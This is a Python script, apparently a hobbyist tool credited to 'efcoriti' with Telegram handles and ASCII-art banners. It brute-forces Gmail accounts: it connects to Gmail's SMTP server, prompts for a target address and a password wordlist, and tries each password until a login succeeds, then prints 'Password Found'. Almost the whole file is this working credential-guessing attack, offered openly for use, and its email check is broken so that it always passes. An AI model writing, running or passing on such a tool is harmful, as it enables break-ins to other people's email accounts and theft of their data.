import smtplib
import termcolor2
import termcolor
from colorama import Fore
smtpserver = smtplib.SMTP("smtp.gmail.com" ,587)
smtpserver.ehlo()
smtpserver.starttls()
print(Fore.RED)
print(""".                                                      .
      .n                     .             .                n.
  . .dP                   dP               9b               9b   .
 4  qXb         .        dX                 Xb       .      dXp   t
dX.  9Xb      .dXb                              dXb.   dXP   .Xb
9XXb._     _.dXXXXb dXXXXbo.               dXXXXb dXXXXb._   _.dXXP
 9XXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXP
   9XXXXXXXXXXXXXXX ~   ~ OOO8b   d8OOO ~   ~ XXXXXXXXXXXXXXXXXP
     9XXXXXP   9XX      *     98v8P      *     XXP   9XXXXXXXP
      ~~~       9X.          .db|db.          .XP       ~~~
                  )b.  .dbo.dP' v  9b.odb.  .dX(
                ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
               dXXXXXXXXXXXP'   .    9XXXXXXXXXXXb
              dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
              9XXb'    XXXXXb.dX|Xb.dXXXXX'    dXXP
                       9XXXXXX(   )XXXXXXP
                       XXXX X. v .X XXXX
                        XP^X' b   d' X^XX
                        X. 9         P )X
                         b          '  d'""")
print("""
       __                _ _   _
  ___ / _| ___ ___  _ __(_) |_(_)
 / _ \ |_ / __/ _ \| '__| | __| |
|  __/  _| (_| (_) | |  | | |_| |
 \___|_|  \___\___/|_|  |_|\__|_|


""")
print(termcolor2.colored('telegram channel => @efcoriti_programmer' , color = "yellow"))
print(termcolor2.colored('coded by efcoriti' , color = "cyan"))
print(termcolor2.colored('ID Rubika & Telegram : @eFcoriti' , color = "magenta"))
print("\n\n\n\n\n\n\n\n\n\n")
print(termcolor2.colored('>>>> NUMBER[1]  Enter your gmail' , color = "green"))
print(termcolor2.colored('>>>> NUMBER[2]  help' , color = "white"))
print(termcolor2.colored('>>>> NUMBER[3]  exit' , color = "red"))
print("\n")
UID = input("Enter  Your  NUMBER  :  ")
UID = int(UID)
print("\n\n")
def ano ():
    email = input(">>=  Enter your gmail  :  ")
    if('@gmail.com'" in email"):
        email = email
       
        password_file = input(termcolor2.colored('>>=  Enter Your Password Files  :  '))
        password_file = open(password_file ,"r")
        for password in password_file:
           try:
               smtpserver.login(email,password)
               print("Password Found  :  ",password)
               break
           except smtplib.SMTPAuthenticationError :
                print("Password injections  :  ",password)
        input("Enter Your Continue  :  ")
    else:
        print(">>>not gmail")
        y = input(">>>rty agin (y,n)")
        if(y == "y"):
            ano()
        if(y == "n"):
            exit()
        if(y == "yes"):
            ano()
        if(y == "no"):
            exit()
        if(y == "Y"):
            ano()
        if(y == "N"):
            exit()
        if(y == "YES"):
            ano()
        if(y == "NO"):
            exit()
        
def help():
    print("\t \tCodyd By Efcoriti")
    print("\t \t     version  1.0")
    print("\t \t programing  :  python")
    print("\n\n\n\n\n\n")
    print("\n\n\n")
    print(">>>> NUMBER[1]  Enter Your Gmail Traget   ")
    print(">>>> NUMBER[2]  help ")
    print(">>>> NUMBER[3]  Exit ")
    print("\n")
    UID = input("Enter  Your  NUMBER  :  ")
    UID = int(UID)
    if(UID == 1):
        ano()
    if(UID == 2):
        help()
    if(UID == 3):
        exit()
if(UID == 1):
    ano()
if(UID == 2):
    help()
if(UID == 3):
    exit()
ano()
